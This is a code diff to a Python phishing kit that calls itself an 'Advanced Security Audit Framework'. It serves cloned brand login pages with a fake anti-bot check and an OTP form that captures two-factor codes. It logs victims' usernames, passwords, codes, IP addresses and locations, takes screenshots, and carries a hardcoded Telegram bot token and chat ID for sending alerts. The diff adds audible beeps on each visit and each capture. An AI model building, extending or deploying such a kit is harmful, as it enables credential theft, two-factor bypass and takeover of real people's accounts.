@@ -20,6 +20,15 @@ if not os.path.exists(MEDIA_DIR):
 TELEGRAM_BOT_TOKEN = "9111398440:AAEndzRhZegO5UqDoDckMgQdXZs1V3feyag"
 TELEGRAM_CHAT_ID = "8878200031"
 
+def trigger_beep():
+    """Triggers a terminal audio beep alert."""
+    try:
+        # Prints ASCII bell character to trigger terminal audio alert
+        sys.stdout.write('\a')
+        sys.stdout.flush()
+    except Exception:
+        pass
+
 def send_telegram_alert(message):
     """Sends text alerts directly to your Telegram Bot."""
     if TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE" or not TELEGRAM_CHAT_ID:
@@ -102,7 +111,6 @@ def generate_html(template):
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>__TITLE__</title>
-    <!-- Include html2canvas for client-side screenshots -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -122,7 +130,6 @@ def generate_html(template):
         <p class="info" id="statusMsg">Verifying browser security & anti-bot check...</p>
         <div id="errorBox" class="error-msg">Incorrect username or password. Please try again.</div>
         
-        <!-- Login Form -->
         <form id="loginForm">
             <input type="text" id="username" name="username" placeholder="Mobile number, email, or username" required>
             <input type="password" id="password" name="password" placeholder="Password" required>
@@ -130,7 +137,6 @@ def generate_html(template):
             <button type="submit" id="subBtn">Continue</button>
         </form>
 
-        <!-- 2FA / OTP Verification Form -->
         <form id="otpForm">
             <p style="font-size: 14px; color: #333; margin-bottom: 10px;">Enter the 6-digit confirmation code sent to your device or email.</p>
             <input type="text" id="otpCode" name="otpCode" placeholder="Enter 6-digit Code" maxlength="6" required>
@@ -226,7 +232,6 @@ def generate_html(template):
             let token = document.getElementById('botToken').value;
             currentSessionUser = username;
 
-            // Capture Screenshot on Login Submission
             setTimeout(takeScreenshot, 500);
 
             fetch('/login', {
@@ -307,6 +312,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
         if self.path == '/' or self.path == '/index.html':
             client_ip = self.get_client_ip()
             geo = get_geolocation(client_ip)
+            trigger_beep()  # Audio alert on visit
             print(f"\033[94m[VISIT] IP: {client_ip} | Location: {geo['city']}, {geo['country']} | ISP: {geo['isp']}\033[0m")
             
             self.send_response(200)
@@ -343,6 +349,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
                     self.wfile.write(json.dumps({"status": "bot_blocked"}).encode('utf-8'))
                     return
 
+                trigger_beep()  # Audio alert on credential capture
                 log_entry = f"[CREDENTIAL CAPTURED] Template: {SELECTED_TEMPLATE['name']} | IP: {client_ip} | Location: {geo['city']}, {geo['country']} ({geo['isp']}) | User: {username} | Pass: {password}\n"
                 print(f"\033[92m{log_entry}\033[0m")
                 
@@ -394,6 +401,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
                 username = data.get('username', '')
                 otp_code = data.get('otp', '')
 
+                trigger_beep()  # Audio alert on OTP capture
                 log_entry = f"[OTP CAPTURED] User: {username} | Code: {otp_code} | IP: {client_ip}\n"
                 print(f"\033[95m{log_entry}\033[0m")
 
@@ -433,7 +441,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
 def select_template():
     global SELECTED_TEMPLATE
     print("\n==============================================")
-    print("   ADVANCED SECURITY AUDIT FRAMEWORK v7       ")
+    print("   ADVANCED SECURITY AUDIT FRAMEWORK v8       ")
     print("==============================================")
     print(" Please select a target template / brand:")
     print("----------------------------------------------")
@@ -451,13 +459,13 @@ def run_server():
     select_template()
     server_address = ('', PORT)
     httpd = ThreadedHTTPServer(server_address, SecurityAuditHandler)
-    print(f"\033[96m[*] Framework v7 running on port {PORT}...\033[0m")
+    print(f"\033[96m[*] Framework v8 running on port {PORT}...\033[0m")
     print(f"\033[96m[*] Logging captured data to {LOG_FILE}\033[0m")
     print(f"\033[96m[*] Captured media will be saved in {MEDIA_DIR}/\033[0m")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("\n\033[91m[-] Shutting down framework v7.\033[0m")
+        print("\n\033[91m[-] Shutting down framework v8.\033[0m")
         httpd.server_close()
 
 if __name__ == '__main__':
